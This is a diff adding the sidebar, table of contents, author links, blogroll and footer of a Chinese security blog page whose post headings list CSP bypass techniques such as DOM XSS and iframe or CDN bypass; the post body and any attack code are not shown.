+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81CSP%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8"><span class="nav-number">1.</span> <span class="nav-text">验证CSP是否安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8BCSP%E7%AD%96%E7%95%A5"><span class="nav-number">1.1.</span> <span class="nav-text">在线评测CSP策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Chrome%E6%8F%92%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">Chrome插件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%98%8E%E7%A1%AECSP%E5%AF%B9%E5%89%8D%E7%AB%AF%E6%94%BB%E5%87%BB%E7%9A%84%E9%98%B2%E5%BE%A1%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">0x01 明确CSP对前端攻击的防御点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-CSP%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">0x02 CSP绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#URL%E8%B7%B3%E8%BD%AC"><span class="nav-number">3.1.</span> <span class="nav-text">URL跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-link-gt-%E6%A0%87%E7%AD%BE%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="nav-number">3.2.</span> <span class="nav-text">&lt;link&gt;标签预加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%A5%E5%85%A8"><span class="nav-number">3.3.</span> <span class="nav-text">利用浏览器补全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DOM-XSS"><span class="nav-number">3.4.</span> <span class="nav-text">利用DOM XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8CSS%E9%9D%99%E6%80%81xss%E8%8E%B7%E5%8F%96nonce%E5%80%BC"><span class="nav-number">3.5.</span> <span class="nav-text">利用CSS静态xss获取nonce值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE"><span class="nav-number">3.6.</span> <span class="nav-text">利用跨域传输数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%89%A7%E8%A1%8CJS"><span class="nav-number">3.7.</span> <span class="nav-text">利用文件上传执行JS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Iframe%E7%BB%95%E8%BF%87"><span class="nav-number">3.8.</span> <span class="nav-text">利用Iframe绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8CDN%E7%BB%95%E8%BF%87"><span class="nav-number">3.9.</span> <span class="nav-text">用CDN绕过</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ashing"
+      src="/ashin9/ashin9.github.io/images/dxx.jpg">
+  <p class="site-author-name" itemprop="name">Ashing</p>
+  <div class="site-description" itemprop="description">Cyber Security</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ashin9/ashin9.github.io/archives/">
+        
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ashin9/ashin9.github.io/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ashin9/ashin9.github.io/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ashin9" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ashin9"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ashin9@foxmail.com" title="E-Mail → mailto:ashin9@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ttonys.github.io/" title="https:&#x2F;&#x2F;ttonys.github.io&#x2F;" rel="noopener" target="_blank">tongs</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://j0k3r.top/" title="http:&#x2F;&#x2F;j0k3r.top&#x2F;" rel="noopener" target="_blank">joker</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://daolgts.github.io/" title="https:&#x2F;&#x2F;daolgts.github.io" rel="noopener" target="_blank">daolgts</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzt.ac.cn/" title="https:&#x2F;&#x2F;wzt.ac.cn&#x2F;" rel="noopener" target="_blank">CataLpa</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://asa9ao.xyz/" title="http:&#x2F;&#x2F;asa9ao.xyz&#x2F;" rel="noopener" target="_blank">Asa9ao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://v0w.top/" title="https:&#x2F;&#x2F;v0w.top" rel="noopener" target="_blank">vOw</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ashing</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ashin9/ashin9.github.io/lib/anime.min.js"></script>
+  <script src="/ashin9/ashin9.github.io/lib/velocity/velocity.min.js"></script>
+  <script src="/ashin9/ashin9.github.io/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ashin9/ashin9.github.io/js/utils.js"></script>
+
+<script src="/ashin9/ashin9.github.io/js/motion.js"></script>
+
+
+<script src="/ashin9/ashin9.github.io/js/schemes/pisces.js"></script>
+
+
+<script src="/ashin9/ashin9.github.io/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
